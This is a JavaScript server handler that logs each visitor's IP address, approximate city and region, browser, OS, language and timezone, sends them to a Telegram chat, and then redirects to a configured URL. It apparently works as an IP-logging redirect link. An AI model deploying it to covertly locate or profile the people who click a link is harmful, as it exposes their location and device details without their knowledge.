const SITEVERIFY_URL = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
const TELEGRAM_URL = 'https://api.telegram.org/bot';
const MAX_TOKEN_LENGTH = 2048;

const text = (input, max = 180) => typeof input === 'string' ? input.slice(0, max).replace(/[\u0000-\u001F\u007F]/g, ' ') : '';
const html = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
const value = (s) => html(s || 'Unavailable');
const configured = (s) => typeof s === 'string' && Boolean(s.trim()) && !s.startsWith('replace_');

function decodeCity(s) {
  if (!s) return '';
  try { return decodeURIComponent(s); } catch { return s; }
}

function browserFromUA(ua) {
  if (/Edg\//.test(ua)) return 'Microsoft Edge';
  if (/OPR\//.test(ua)) return 'Opera';
  if (/Firefox\//.test(ua)) return 'Firefox';
  if (/Chrome\//.test(ua)) return 'Google Chrome';
  if (/Safari\//.test(ua)) return 'Safari';
  return 'Unknown';
}
function osFromUA(ua) {
  if (/Android/.test(ua)) return 'Android';
  if (/iPhone|iPad|iPod/.test(ua)) return 'iOS / iPadOS';
  if (/Windows/.test(ua)) return 'Windows';
  if (/Mac OS X/.test(ua)) return 'macOS';
  if (/Linux/.test(ua)) return 'Linux';
  return 'Unknown';
}

function requestMetadata(req, details = {}) {
  const h = req.headers;
  const ua = text(h.get('user-agent'), 220);
  // Vercel manages these edge headers. Do not trust client-provided variants on an unproxied host.
  const ip = text(h.get('x-forwarded-for')?.split(',')[0]?.trim(), 80);
  return {
    ip,
    country: text(h.get('x-vercel-ip-country'), 12),
    city: text(decodeCity(h.get('x-vercel-ip-city')), 90),
    region: text(h.get('x-vercel-ip-country-region'), 20),
    browser: browserFromUA(ua),
    os: osFromUA(ua),
    userAgent: ua,
    language: text(details.language, 35),
    timezone: text(details.timezone, 70),
    connection: text(details.connection, 24),
    timestamp: new Date().toISOString(),
  };
}

// The default is OFF even if somebody left old Turnstile keys in the environment.
// If explicitly set to 'optional' with BOTH keys, the widget may run, but never gates a redirect.
export function turnstileEnabled(env) {
  return env.TURNSTILE_MODE === 'optional' && configured(env.TURNSTILE_SITE_KEY) && configured(env.TURNSTILE_SECRET);
}

export function validDestination(env) {
  try {
    const url = new URL(env.DEST_URL);
    if (url.protocol !== 'https:' || url.username || url.password) return null;
    return url.href;
  } catch { return null; }
}

export function publicConfiguration(env) {
  const redirect = validDestination(env);
  if (!redirect) return null;
  const active = turnstileEnabled(env);
  return { redirect, turnstileEnabled: active, ...(active ? { siteKey: env.TURNSTILE_SITE_KEY } : {}) };
}

export function formattedTelegram(data, checkStatus = 'Not enabled') {
  // Telegram HTML formatting. Escape all metadata, including the User-Agent.
  return [
    '🟣 <b>NEW WEBSITE VISITOR</b>',
    '━━━━━━━━━━━━━━━━━━━━',
    '',
    '🕓 <b>Visit</b>',
    `Time (UTC): <code>${value(data.timestamp)}</code>`,
    `Optional Cloudflare check: ${value(checkStatus)}`,
    '',
    '🌐 <b>Network &amp; approximate location</b>',
    `Public IP: <code>${value(data.ip)}</code>`,
    `Country: ${value(data.country)}`,
    `City: ${value(data.city)}`,
    `Region: ${value(data.region)}`,
    `Connection estimate: ${value(data.connection)}`,
    '',
    '💻 <b>Browser &amp; device</b>',
    `Browser: ${value(data.browser)}`,
    `Operating system: ${value(data.os)}`,
    `Language: ${value(data.language)}`,
    `Time zone: ${value(data.timezone)}`,
    `User agent: <code>${value(data.userAgent)}</code>`,
    '',
    'ℹ️ IP-based location is approximate. No phone number or GPS was accessed.',
  ].join('\n');
}

function respond(message, status) {
  return Response.json({ error: message }, { status, headers: { 'Cache-Control': 'no-store' } });
}

async function optionalCheck(env, doFetch, hostname, ip, token) {
  if (!turnstileEnabled(env)) return 'Not enabled';
  if (typeof token !== 'string' || token.length < 8 || token.length > MAX_TOKEN_LENGTH) return 'Not completed';
  try {
    const form = new URLSearchParams({ secret: env.TURNSTILE_SECRET, response: token });
    if (ip) form.set('remoteip', ip);
    const response = await doFetch(SITEVERIFY_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: form.toString(),
      signal: AbortSignal.timeout(3000),
    });
    if (!response.ok) return 'Unavailable';
    const result = await response.json();
    return result?.success && result.hostname === hostname ? 'Passed' : 'Not completed';
  } catch {
    return 'Unavailable';
  }
}

async function sendTelegram(env, doFetch, meta, checkStatus) {
  if (!configured(env.TELEGRAM_BOT_TOKEN) || !configured(env.TELEGRAM_CHAT_ID)) return false;
  try {
    const response = await doFetch(`${TELEGRAM_URL}${encodeURIComponent(env.TELEGRAM_BOT_TOKEN)}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text: formattedTelegram(meta, checkStatus),
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
      signal: AbortSignal.timeout(4500),
    });
    const body = await response.json();
    return response.ok && body?.ok === true;
  } catch {
    // Failure is intentionally nonblocking. The redirect does not depend on Telegram uptime.
    return false;
  }
}

export async function visitRequest(request, { env = process.env, doFetch = fetch } = {}) {
  if (request.method !== 'POST') return respond('Method not allowed.', 405);
  const redirect = validDestination(env);
  if (!redirect) return respond('Destination is not configured.', 503);

  let origin;
  let hostname;
  try {
    const url = new URL(request.url);
    if (url.protocol !== 'https:' && !(url.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(url.hostname))) {
      return respond('HTTPS required.', 400);
    }
    origin = url.origin;
    hostname = url.hostname;
  } catch { return respond('Invalid request URL.', 400); }
  if (request.headers.get('origin') !== origin) return respond('Incorrect request origin.', 403);
  if (!request.headers.get('content-type')?.includes('application/json')) return respond('JSON required.', 415);
  if (Number(request.headers.get('content-length') || '0') > 6000) return respond('Payload too large.', 413);
  let body;
  try { body = await request.json(); } catch { return respond('Invalid request.', 400); }
  if (!body || typeof body !== 'object' || Array.isArray(body)) return respond('Invalid request.', 400);

  const meta = requestMetadata(request, body);
  const checkStatus = await optionalCheck(env, doFetch, hostname, meta.ip, body.token);
  const notificationSent = await sendTelegram(env, doFetch, meta, checkStatus);
  return Response.json({ ok: true, redirect, notificationSent }, { headers: { 'Cache-Control': 'no-store' } });
}
